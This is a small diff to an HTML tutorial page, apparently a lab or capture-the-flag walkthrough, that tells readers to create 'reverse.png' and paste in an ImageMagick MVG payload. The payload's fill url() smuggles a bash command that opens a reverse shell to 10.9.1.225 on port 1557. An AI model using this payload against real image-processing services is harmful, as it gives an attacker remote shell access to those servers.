@@ -22,7 +22,7 @@
 	<h3>On you local create a file with the extension .png shown in the commands below</h3>
 		<h4>touch reverse.png</h4>
 		<h4> nano reverse.png</h4>
-	<h3>Paste this code in</h3>
+	<h3>Paste this code in using an editor like vim or nano</h3>
 		<h4>push graphic-context</h4>
 		<h4>viewbox 0 0 640 480</h4>
 		<h4>fill 'url(https://example.com";bash -c \'bash -i >& /dev/tcp/10.9.1.225/1557 0>&1\'")'</h4>
